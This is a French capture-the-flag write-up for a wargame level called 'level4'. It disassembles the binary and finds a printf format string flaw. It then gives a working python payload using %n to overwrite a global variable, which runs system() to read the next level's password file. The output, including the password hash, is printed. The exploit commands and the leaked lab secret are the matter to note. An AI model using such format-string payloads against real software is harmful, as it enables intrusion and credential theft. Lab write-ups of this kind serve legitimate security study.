#	level4, toujours un programme similaire aux precedents, regardons le code:

$> objdump -d ./level4
[...]
08048444 <p>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	8b 45 08             	mov    0x8(%ebp),%eax
 804844d:	89 04 24             	mov    %eax,(%esp)
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>	<--	printf(buff);
 8048455:	c9                   	leave
 8048456:	c3                   	ret

08048457 <n>:
 8048457:	55                   	push   %ebp
 8048458:	89 e5                	mov    %esp,%ebp
 804845a:	81 ec 18 02 00 00    	sub    $0x218,%esp			<--	allocation de 536
 8048460:	a1 04 98 04 08       	mov    0x8049804,%eax
 8048465:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048469:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)	
 8048470:	00
 8048471:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax	<--	buff[520]
 8048477:	89 04 24             	mov    %eax,(%esp)
 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>	<--	fgets(buff, 512, stdin)
 804847f:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 8048485:	89 04 24             	mov    %eax,(%esp)
 8048488:	e8 b7 ff ff ff       	call   8048444 <p>			<-- p(buff)
 804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax		<--	if (m == 16930116)
 8048497:	75 0c                	jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08 	movl   $0x8048590,(%esp)
 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>	<--	system(system("/bin/cat /home/user/level5/.pass")
 80484a5:	c9                   	leave
 80484a6:	c3                   	ret							<--	return

080484a7 <main>:
 80484a7:	55                   	push   %ebp
 80484a8:	89 e5                	mov    %esp,%ebp
 80484aa:	83 e4 f0             	and    $0xfffffff0,%esp
 80484ad:	e8 a5 ff ff ff       	call   8048457 <n>			<--	n
 80484b2:	c9                   	leave
 80484b3:	c3                   	ret
 80484b4:	90                   	nop
 80484b5:	90                   	nop
 80484b6:	90                   	nop
 80484b7:	90                   	nop
 80484b8:	90                   	nop
 80484b9:	90                   	nop
 80484ba:	90                   	nop
 80484bb:	90                   	nop
 80484bc:	90                   	nop
 80484bd:	90                   	nop
 80484be:	90                   	nop
 80484bf:	90                   	nop
[...]

#	La faille est la meme que pour l'exercice precedent, un format string exploit. La difference ici est que m a une taille bien trop grande pour le buffer. J'ai longuement cherche a modifier l'adresse sauvegardee dans eip de p() et meme de .fini pour rediriger dans le if, mais impossible.

#	En fait la solution est bien plus simple que ca, il suffit d'utiliser les outils fournis par printf pour afficher un nombre consequent de caractere sans avoir a tous les ecrire. Deja on va chercher l'emplacement du buffer sur la stack:

$> python -c 'print "AAAA" + 16*"%08x."' | ./level4
AAAAb7ff26b0.bffff784.b7fd0ff4.00000000.00000000.bffff748.0804848d.bffff540.00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.

#	On peux voir que le buffer ce situe a la 12eme place sur la stack. Maintenant modifions la valeur de m qui est situee a l'adresse 0x8049810:

$> python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

#	La valeur voulue etant 16930116, il faudra lui retirer la taille de l'adresse donc 4. Le fait de specifier une valeur entre le % et le c va print un nombre voulu de char.
